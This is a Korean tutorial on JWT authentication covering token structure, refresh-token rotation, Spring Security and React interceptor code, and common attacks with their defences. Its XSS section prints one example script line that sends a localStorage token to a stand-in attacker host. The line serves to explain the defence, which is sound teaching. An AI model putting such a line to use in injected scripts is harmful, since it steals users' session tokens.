세션 방식은 서버가 로그인 상태를 직접 기억한다. 서버가 여러 대로 늘어나면 세션 공유 문제가 생긴다. JWT는 인증 정보를 토큰 안에 담아 클라이언트가 보관하게 함으로써 서버를 무상태(stateless)로 유지한다.

## JWT란

**JSON Web Token**. 세 부분을 `.`으로 연결한 문자열이다.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwibmFtZSI6Iuq5jOuPhCIsInJvbGUiOiJVU0VSIiwiaWF0IjoxNzQzNTI1NjAwLCJleHAiOjE3NDM1MjkyMDB9.4Xv8bKqW2mN3pL9sR7tY1uA6vZ0dF5gH8jC2eI4oM9s

└──────────────┘ └──────────────────────────────────────┘ └──────────────────────────────────────┘
    Header                    Payload                                Signature
```

각 부분은 **Base64URL** 인코딩된 JSON이다. 암호화가 아니라 인코딩이므로 누구나 디코딩해서 내용을 읽을 수 있다. 중요한 것은 **서명(Signature)** 으로 위변조를 감지하는 것이다.

## 구조 상세

### Header

```json
{
  "alg": "HS256",  // 서명 알고리즘
  "typ": "JWT"
}
```

| 알고리즘 | 종류 | 설명 |
|---------|------|------|
| `HS256` | 대칭키 (HMAC) | 동일한 비밀키로 서명·검증 |
| `RS256` | 비대칭키 (RSA) | 개인키로 서명, 공개키로 검증 |
| `ES256` | 비대칭키 (ECDSA) | RS256보다 키가 짧고 빠름 |

### Payload (Claims)

```json
{
  "sub": "1234",           // subject — 토큰 주체 (보통 userId)
  "name": "홍길동",
  "role": "USER",
  "iat": 1743525600,       // issued at — 발급 시각 (Unix timestamp)
  "exp": 1743529200,       // expiration — 만료 시각
  "iss": "auth-service",   // issuer — 발급자
  "aud": "api-server"      // audience — 수신자
}
```

**Payload는 누구나 읽을 수 있다.** 비밀번호, 카드번호 등 민감 정보를 절대 담지 않는다.

### Signature

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

서버는 수신한 토큰의 Header + Payload로 서명을 다시 계산해 일치 여부를 확인한다. Payload를 조작하면 서명이 달라지므로 위변조를 즉시 감지한다.

## 세션 vs JWT

| 항목 | 세션 | JWT |
|------|------|-----|
| 상태 저장 | 서버(메모리/DB/Redis) | 클라이언트 |
| 수평 확장 | 세션 공유 필요 | 서버 무상태 — 쉬움 |
| 즉시 무효화 | 서버에서 즉시 삭제 가능 | 만료 전 무효화 어려움 |
| 네트워크 부하 | 매 요청마다 서버 조회 | 토큰 자체로 검증 완료 |
| 토큰 크기 | 세션 ID만 전달 (작음) | Claim 포함 (세션보다 큼) |

JWT의 가장 큰 단점은 **만료 전 무효화**다. 로그아웃해도 토큰이 만료되기 전까지 이론상 유효하다. 이 문제를 Refresh Token 전략으로 완화한다.

## Access Token + Refresh Token

토큰을 두 가지로 분리하는 것이 실무 표준이다.

```
Access Token
  - 수명: 짧게 (15분 ~ 1시간)
  - 용도: API 요청 인가
  - 저장: 메모리 또는 httpOnly 쿠키

Refresh Token
  - 수명: 길게 (7일 ~ 30일)
  - 용도: Access Token 재발급
  - 저장: httpOnly 쿠키 (반드시)
  - 서버에 저장 (DB/Redis) — 무효화 가능하게
```

```
[최초 로그인]
Client ──POST /login──▶ Server
       ◀── Access Token (15분) ──
       ◀── Refresh Token (7일, httpOnly Cookie) ──

[API 요청]
Client ──GET /api/posts (Authorization: Bearer <AT>)──▶ Server
       ◀── 200 OK ──

[Access Token 만료 후]
Client ──POST /auth/refresh (Cookie: RT)──▶ Server
       ◀── 새 Access Token ──
       (RT도 교체 — Refresh Token Rotation)

[로그아웃]
Client ──POST /logout──▶ Server
                         Server: DB에서 RT 삭제
       ◀── 204 No Content ──
```

### JwtProvider

```java
@Component
@RequiredArgsConstructor
public class JwtProvider {

    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.access-token-expiry}")
    private long accessTokenExpiry;

    @Value("${jwt.refresh-token-expiry}")
    private long refreshTokenExpiry;

    private SecretKey getSigningKey() {
        return Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8));
    }

    // Access Token 생성
    public String generateAccessToken(Long userId, String role) {
        return Jwts.builder()
            .subject(String.valueOf(userId))
            .claim("role", role)
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis() + accessTokenExpiry))
            .signWith(getSigningKey())
            .compact();
    }

    // Refresh Token 생성 (최소한의 정보만)
    public String generateRefreshToken(Long userId) {
        return Jwts.builder()
            .subject(String.valueOf(userId))
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis() + refreshTokenExpiry))
            .signWith(getSigningKey())
            .compact();
    }

    // 토큰 파싱 및 검증
    public Claims validateAndParse(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .build()
            .parseSignedClaims(token)
            .getPayload();
    }

    // userId 추출
    public Long getUserId(String token) {
        return Long.parseLong(validateAndParse(token).getSubject());
    }

    // 토큰 만료 여부 확인
    public boolean isExpired(String token) {
        try {
            validateAndParse(token);
            return false;
        } catch (ExpiredJwtException e) {
            return true;
        }
    }
}
```

### 로그인 및 토큰 발급

```java
@Service
@RequiredArgsConstructor
public class AuthService {

    private final UserRepository userRepository;
    private final RefreshTokenRepository refreshTokenRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtProvider jwtProvider;

    @Transactional
    public TokenResponse login(LoginRequest request) {
        User user = userRepository.findByEmail(request.getEmail())
            .orElseThrow(() -> new AuthException(ErrorCode.USER_NOT_FOUND));

        if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
            throw new AuthException(ErrorCode.INVALID_PASSWORD);
        }

        String accessToken = jwtProvider.generateAccessToken(user.getId(), user.getRole().name());
        String refreshToken = jwtProvider.generateRefreshToken(user.getId());

        // Refresh Token을 DB에 저장 (무효화 가능하게)
        refreshTokenRepository.save(RefreshToken.of(user.getId(), refreshToken));

        return new TokenResponse(accessToken, refreshToken);
    }

    @Transactional
    public TokenResponse refresh(String refreshToken) {
        // 1. 서명·만료 검증
        Claims claims;
        try {
            claims = jwtProvider.validateAndParse(refreshToken);
        } catch (JwtException e) {
            throw new AuthException(ErrorCode.INVALID_TOKEN);
        }

        Long userId = Long.parseLong(claims.getSubject());

        // 2. DB에 저장된 토큰과 일치 확인 (탈취 감지)
        RefreshToken stored = refreshTokenRepository.findByUserId(userId)
            .orElseThrow(() -> new AuthException(ErrorCode.INVALID_TOKEN));

        if (!stored.getToken().equals(refreshToken)) {
            // 다른 토큰이면 탈취 의심 — 모든 세션 무효화
            refreshTokenRepository.deleteByUserId(userId);
            throw new AuthException(ErrorCode.TOKEN_REUSE_DETECTED);
        }

        User user = userRepository.findById(userId).orElseThrow();

        // 3. 새 토큰 발급 (Refresh Token Rotation)
        String newAccessToken = jwtProvider.generateAccessToken(userId, user.getRole().name());
        String newRefreshToken = jwtProvider.generateRefreshToken(userId);

        stored.rotate(newRefreshToken);  // DB RT 교체

        return new TokenResponse(newAccessToken, newRefreshToken);
    }

    @Transactional
    public void logout(Long userId) {
        refreshTokenRepository.deleteByUserId(userId);
    }
}
```

### Spring Security 필터

```java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtProvider jwtProvider;

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {

        String token = extractToken(request);

        if (token != null) {
            try {
                Claims claims = jwtProvider.validateAndParse(token);
                Long userId = Long.parseLong(claims.getSubject());
                String role = claims.get("role", String.class);

                UsernamePasswordAuthenticationToken auth =
                    new UsernamePasswordAuthenticationToken(
                        userId,
                        null,
                        List.of(new SimpleGrantedAuthority("ROLE_" + role))
                    );

                SecurityContextHolder.getContext().setAuthentication(auth);

            } catch (ExpiredJwtException e) {
                response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Token expired");
                return;
            } catch (JwtException e) {
                response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Invalid token");
                return;
            }
        }

        filterChain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String header = request.getHeader("Authorization");
        if (header != null && header.startsWith("Bearer ")) {
            return header.substring(7);
        }
        return null;
    }
}
```

```java
@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final JwtAuthenticationFilter jwtAuthFilter;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable())  // JWT는 stateless이므로 CSRF 불필요
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
            .build();
    }
}
```

## 클라이언트 측 구현 (React)

### 토큰 저장 전략

```
Access Token 저장 위치
  ✓ 메모리 (변수) — XSS에 안전, 새로고침 시 사라짐
  ✓ httpOnly Cookie — XSS에 안전, CSRF 주의 (SameSite=Strict으로 완화)
  ✗ localStorage — XSS 공격에 그대로 노출, 사용 지양

Refresh Token 저장 위치
  ✓ httpOnly Cookie — 반드시. JS로 접근 불가
```

```typescript
// Access Token을 메모리에 보관하는 패턴
let accessToken: string | null = null

export const tokenStore = {
  get: () => accessToken,
  set: (token: string) => { accessToken = token },
  clear: () => { accessToken = null },
}
```

### Axios 인터셉터로 자동 갱신

```typescript
import axios from 'axios'
import { tokenStore } from './tokenStore'

const api = axios.create({
  baseURL: '/api',
  withCredentials: true,  // httpOnly Cookie(RT) 자동 전송
})

// 요청 인터셉터 — Access Token 자동 첨부
api.interceptors.request.use((config) => {
  const token = tokenStore.get()
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})

// 응답 인터셉터 — 401 시 자동 갱신 후 재시도
let isRefreshing = false
let refreshQueue: Array<(token: string) => void> = []

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const original = error.config

    // Access Token 만료 (401) + 재시도 안 한 요청
    if (error.response?.status === 401 && !original._retry) {
      original._retry = true

      if (isRefreshing) {
        // 이미 갱신 중이면 대기열에 추가
        return new Promise((resolve) => {
          refreshQueue.push((newToken) => {
            original.headers.Authorization = `Bearer ${newToken}`
            resolve(api(original))
          })
        })
      }

      isRefreshing = true

      try {
        // Refresh Token으로 새 Access Token 발급
        const { data } = await axios.post('/api/auth/refresh', {}, {
          withCredentials: true,
        })

        tokenStore.set(data.accessToken)

        // 대기 중인 요청들 모두 재시도
        refreshQueue.forEach((cb) => cb(data.accessToken))
        refreshQueue = []

        original.headers.Authorization = `Bearer ${data.accessToken}`
        return api(original)

      } catch (refreshError) {
        // RT도 만료되면 로그인 페이지로
        tokenStore.clear()
        refreshQueue = []
        window.location.href = '/login'
        return Promise.reject(refreshError)

      } finally {
        isRefreshing = false
      }
    }

    return Promise.reject(error)
  }
)

export default api
```

## 보안 취약점과 대응

### 1. XSS (Cross-Site Scripting)

```
공격: 악성 스크립트가 localStorage의 토큰을 탈취
  document.location='https://attacker.com?token='+localStorage.getItem('jwt')

대응:
  - Access Token → 메모리 저장
  - Refresh Token → httpOnly Cookie (JS 접근 불가)
  - Content-Security-Policy 헤더 설정
```

### 2. CSRF (Cross-Site Request Forgery)

```
공격: 다른 사이트에서 피해자의 쿠키를 이용한 요청 위조

대응:
  - Cookie에 SameSite=Strict 또는 SameSite=Lax 설정
  - 민감 API에 CSRF 토큰 추가 또는 Custom Header 요구
    (XHR/fetch에 커스텀 헤더를 추가할 수 있는 것은 같은 출처뿐)
```

```java
// Spring에서 쿠키 설정
ResponseCookie cookie = ResponseCookie.from("refresh_token", refreshToken)
    .httpOnly(true)
    .secure(true)          // HTTPS에서만 전송
    .sameSite("Strict")    // 같은 사이트 요청만 쿠키 전송
    .path("/api/auth")     // Refresh 엔드포인트에만 전송
    .maxAge(Duration.ofDays(7))
    .build();

response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
```

### 3. Refresh Token Rotation + 재사용 감지

```
공격: Refresh Token 탈취 후 무한 재발급

대응: Refresh Token Rotation
  - RT 사용 시마다 새 RT 발급 + 이전 RT 무효화
  - DB에 저장된 RT와 다른 RT로 요청이 오면 탈취 의심
    → 해당 사용자의 모든 RT 즉시 삭제 (강제 재로그인)
```

```java
// 재사용 감지 로직
if (!stored.getToken().equals(refreshToken)) {
    // 저장된 것과 다른 RT → 이전 RT가 재사용됨 → 탈취
    refreshTokenRepository.deleteAllByUserId(userId);
    throw new AuthException(ErrorCode.TOKEN_REUSE_DETECTED);
}
```

### 4. 토큰 만료 시간

```
너무 길면: 탈취 시 피해 기간이 길다
너무 짧으면: 갱신 요청이 빈번해 UX 저하

권장:
  Access Token:  15분 ~ 1시간
  Refresh Token: 7일 ~ 30일 (서비스 보안 정책에 따라)
```

## Redis로 블랙리스트 관리

Access Token의 즉시 무효화가 필요할 때 블랙리스트를 활용한다. (탈취 감지, 강제 로그아웃 등)

```java
@Service
@RequiredArgsConstructor
public class TokenBlacklistService {

    private final RedisTemplate<String, String> redisTemplate;

    private static final String BLACKLIST_PREFIX = "blacklist:";

    // 블랙리스트에 추가 (AT 만료 시간까지만 유지)
    public void blacklist(String accessToken, long expiryMillis) {
        redisTemplate.opsForValue().set(
            BLACKLIST_PREFIX + accessToken,
            "revoked",
            Duration.ofMillis(expiryMillis)
        );
    }

    public boolean isBlacklisted(String accessToken) {
        return Boolean.TRUE.equals(
            redisTemplate.hasKey(BLACKLIST_PREFIX + accessToken)
        );
    }
}
```

```java
// 필터에서 블랙리스트 확인
if (tokenBlacklistService.isBlacklisted(token)) {
    response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Token revoked");
    return;
}
```

## 구조 요약

```
[발급]
POST /login
  → Access Token (짧은 수명, 메모리 또는 Cookie)
  → Refresh Token (긴 수명, httpOnly Cookie, DB 저장)

[인가]
GET /api/resource
  Authorization: Bearer <Access Token>
  → JwtFilter: 서명 검증 → Claims 추출 → SecurityContext 설정

[갱신]
POST /auth/refresh (Cookie: refresh_token=...)
  → DB에서 RT 검증
  → 새 AT + 새 RT 발급 (Rotation)
  → 이전 RT 무효화

[로그아웃]
POST /logout
  → DB에서 RT 삭제
  → AT 블랙리스트 등록 (선택)
  → Cookie 만료 처리
```

JWT는 **stateless**라는 장점이 명확하지만, 그 대가로 즉시 무효화가 어렵다. Refresh Token을 서버에 저장하고 Rotation을 적용하면 이 단점을 실용적인 수준으로 완화할 수 있다. 토큰을 어디에 저장하느냐(httpOnly Cookie vs 메모리)가 보안의 절반을 결정하므로, 스토리지 선택에 가장 신중해야 한다.
